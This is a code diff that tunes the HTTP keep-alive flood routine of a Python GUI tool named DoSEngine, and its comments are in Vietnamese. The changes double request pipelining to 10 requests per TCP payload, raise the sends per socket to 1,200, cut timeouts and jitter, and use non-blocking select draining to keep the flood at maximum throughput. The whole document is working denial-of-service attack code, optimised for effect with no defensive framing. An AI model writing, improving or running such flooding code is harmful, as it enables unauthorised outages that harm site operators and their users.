@@ -13,6 +13,7 @@ import time
 import os
 import queue
 import struct
+import select
 import tkinter as tk
 from tkinter import scrolledtext, Entry, Button, Label, StringVar, IntVar, OptionMenu
 from datetime import datetime
@@ -160,47 +161,45 @@ class DoSEngine:
 
     # ---------- KEEP-ALIVE FLOOD ----------
     def keepalive_flood(self):
-        # HTTP Pipelining: Gộp 5 requests trong 1 TCP payload để tối đa hóa throughput
+        # HTTP Pipelining 10x: Gộp 10 requests trong 1 TCP payload để đạt throughput cực đại
         payload = (
             f"GET / HTTP/1.1\r\n"
             f"Host: {self.target}\r\n"
             f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
             f"Connection: keep-alive\r\n\r\n"
-        ).encode() * 5
+        ).encode() * 10
         payload_len = len(payload)
 
-        # Tránh xung đột kết nối đồng loạt
-        time.sleep(random.uniform(0.01, 0.08))
+        # Tránh xung đột kết nối đồng loạt ở mili-giây đầu tiên
+        time.sleep(random.uniform(0.005, 0.05))
 
         while not self.stop_flag:
             s = None
             try:
-                s = self._create_sock(4)
+                s = self._create_sock(3)
                 s.connect((self.target_ip, self.port))
                 local_req = 0
                 local_bytes = 0
 
-                # Giữ kết nối gửi liên tục theo đợt
-                for _ in range(80):
+                # Giữ kết nối gửi liên tục theo đợt (120 vòng * 10 req = 1.200 req / socket)
+                for loop_idx in range(120):
                     if self.stop_flag:
                         break
                     s.sendall(payload)
-                    local_req += 5
+                    local_req += 10
                     local_bytes += payload_len
 
-                    # Xả nhanh bộ đệm nhận để tránh TCP ZeroWindow deadlock
-                    try:
-                        s.setblocking(False)
-                        s.recv(4096)
-                        s.setblocking(True)
-                    except Exception:
+                    # Kiểm tra và xả đệm nhận không chặn bằng select (không phá vỡ socket timeout)
+                    if loop_idx % 4 == 0:
                         try:
-                            s.setblocking(True)
+                            r, _, _ = select.select([s], [], [], 0)
+                            if r:
+                                s.recv(32768)
                         except Exception:
                             pass
 
-                    # Flush counter theo batch để xóa bỏ lock contention
-                    if local_req >= 50:
+                    # Flush counter theo batch 100 requests để triệt tiêu lock contention
+                    if local_req >= 100:
                         self._inc(local_req, local_bytes)
                         local_req = 0
                         local_bytes = 0
